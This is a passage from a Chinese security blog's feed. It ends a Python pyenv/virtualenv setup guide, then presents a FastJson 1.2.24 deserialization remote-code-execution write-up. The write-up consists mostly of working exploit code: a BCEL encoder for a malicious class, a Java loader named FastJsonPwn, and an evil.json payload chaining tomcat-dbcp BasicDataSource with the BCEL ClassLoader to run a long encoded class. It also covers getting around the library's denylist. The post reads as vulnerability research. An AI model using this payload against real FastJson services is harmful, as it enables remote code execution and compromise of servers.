<li>在进行版本切换的时候，可能会出现AttributeError: module ‘enum’ has no attribute ‘IntFlag’或者raise ImportError(‘This package should not be accessible on Python 3. ‘<br>ImportError: This package should not be accessible on Python 3. Either you are trying to run from the python-future src folder or your installation of python-future is corrupted.这个错误，这个时候使用unset PYTHONPATH可以解决问题。<h4 id="配置pycharm"><a href="#配置pycharm" class="headerlink" title="配置pycharm"></a>配置pycharm</h4></li>
<li>现实中我们往往可能需要使用pycharm这种IDE进行python的开发，那么如何在pycharm中进行python版本的自由切换呢？</li>
<li>其实pycharm 和idea都属于 jetbrains家族产品，使用上面很是类似。</li>
<li>打开一个项目，选择file-&gt; Default Settings-&gt; Python Interpreter-&gt; show ALL -&gt; +号 -&gt; Existing environment -&gt; 进行下拉框的选择就OK<br><img src="/2018/07/15/python虚拟环境安装和使用/setpycharm.png" alt=""></li>
<li>之后就可以通过添加完的Python Interpreter选择对应版本的Interpreter进行解释执行了。<h4 id="virtualenv的安装和使用"><a href="#virtualenv的安装和使用" class="headerlink" title="virtualenv的安装和使用"></a>virtualenv的安装和使用</h4></li>
<li>pyenv用于不同python版本之间的切换，还有一种场景就是在确定了python版本之后，需要第三方包不同版本之间的切换，比如不同版本的django版本之间的版本切换，于是就有了virutalenv。</li>
<li><p>安装（还是brew）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Install Homebrew</span><br><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br><span class="line"># Install pyenv-virtualenv</span><br><span class="line">brew install pyenv-virtualenv</span><br><span class="line"># Add pyenv-virtualenv initializer to shell startup script</span><br><span class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</span><br><span class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</span><br><span class="line">echo &apos;eval &quot;$(pyenv virtualenv-init -)&quot;&apos; &gt;&gt; ~/.bash_profile</span><br><span class="line"># Restart your shell for changes to take effect</span><br><span class="line">exec $SHELL</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个虚拟环境 例如 pyenv virtualenv 3.6.1 django-1.10</p>
</li>
<li>激活这个虚拟环境 例如 pyenv activate django-1.10</li>
<li>安装对应版本的第三方包 pip install django==1.10<br><img src="/2018/07/15/python虚拟环境安装和使用/virtualenv.png" alt=""></li>
<li>如上图所示，就相当于进一步定制化了环境（python2.7.14 and django==1.10）。</li>
<li>此外和上面配置pycharm一样对pycharm进行相应开发环境的配置。</li>
<li>退出当前的虚拟环境 pyenv deactivate xxx<h4 id="python常见问题"><a href="#python常见问题" class="headerlink" title="python常见问题"></a>python常见问题</h4></li>
<li>windows下pip安装速度慢解决方法 可以在使用pip的时候加参数-i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></li>
<li>例如：pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a> pyspider，这样就会从清华这边的镜像去安装pyspider库。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><em><a href="https://medium.com/@jordanthomasg/python-development-on-macos-with-pyenv-virtualenv-ec583b92934c" target="_blank" rel="noopener">Python Development on macOS with pyenv-virtualenv</a>
</em><a href="https://www.cnblogs.com/kevingrace/p/10130801.html" target="_blank" rel="noopener">Python多版本管理器-pyenv 介绍及部署记录</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FastJson反序列化漏洞(续)</title>
    <link href="http://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/"/>
    <id>http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/</id>
    <published>2018-06-17T18:47:07.000Z</published>
    <updated>2018-06-28T06:55:02.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="noopener">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li>
<li>作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。<h4 id="details"><a href="#details" class="headerlink" title="details"></a>details</h4></li>
<li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        //There also should be compiled class file,not java file</span><br><span class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</span><br><span class="line">        byte[] data = Files.readAllBytes(path);</span><br><span class="line">        String s =  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这里用于将evil.class文件进行BCEL编码。</p>
<ul>
<li><p>在作者的poc的基础上精简了一下，直接读取并反序列化外部json文件触发漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line">import jdk.internal.dynalink.support.TypeUtilities;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class FastJsonPwn  &#123;</span><br><span class="line"></span><br><span class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</span><br><span class="line">        InputStream is = new FileInputStream(filePath);</span><br><span class="line">        String line; // 用来保存每行读取的内容</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        line = reader.readLine(); // 读取第一行</span><br><span class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</span><br><span class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</span><br><span class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</span><br><span class="line">            line = reader.readLine(); // 读取下一行</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String s = &quot;java.lang.Thread&quot;;</span><br><span class="line">        //long hash = TypeUtilities.fnv1a_64(s);</span><br><span class="line"></span><br><span class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</span><br><span class="line"></span><br><span class="line">//        String classname = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</span><br><span class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">//        Class.forName(classname, true, cls);</span><br><span class="line">        //note  project must contain dbcp external lib</span><br><span class="line">//        String poc = &quot; &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t&#125;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t&#125;\n&quot;;</span><br><span class="line">        StringBuffer Buffer = new StringBuffer();</span><br><span class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</span><br><span class="line">        Object obj= JSON.parseObject(Buffer.toString());</span><br></pre></td></tr></table></figure>
</li>
<li><p>evil.json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<a href="https://github.com/kevien/javacode" target="_blank" rel="noopener">github</a></p>
<h4 id="about-patch"><a href="#about-patch" class="headerlink" title="about patch"></a>about patch</h4><ul>
<li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener">github</a><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li>
<li>作者将原来的denyList改为denyHashCodes的方式进行黑名单拦截（最新版本依然采用这种方式），其中denyHashCode的计算方式略微复杂，增加了攻击门槛。<br><img src="/2018/06/18/FastJson反序列化漏洞(续)/calculatehash.png" alt=""><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li>
<li>较Template攻击方式此攻击方式不需要设置Feature.SupportNonPublicField，但是需要外部的jar包（因为这个jar包和JDBC数据库连接相关，可能很多项目应该都使用了，所以影响也还是很大）。</li>
<li>利用 defineClass 在运行时状态下，将我们精心构造的 class 文件加载进入 ClassLoader，通过<br>java 的 static{}特征，导致代码执行。</li>
<li>此payload较之前的有个好处就是不需要受害者开启Feature.SupportNonPublicField这个‘特性‘。</li>
<li>根据作者之前通过的denylist其实就可以知道这个漏洞的利用方式很多种，和python类似，java很多漏洞都还是绕denyList的问题。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
<li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a></li>
<li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="noopener">Evading Anti-Virus by using dynamic code generation and reflection</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;之前写了篇fastjson反序列化漏洞的分析文章，见&lt;a href=&quot;https://www.cnblo
    
    </summary>
    
    
      <category term="java安全 RCE" scheme="http://kevien.github.io/tags/java%E5%AE%89%E5%85%A8-RCE/"/>
    
  </entry>
  
</feed>
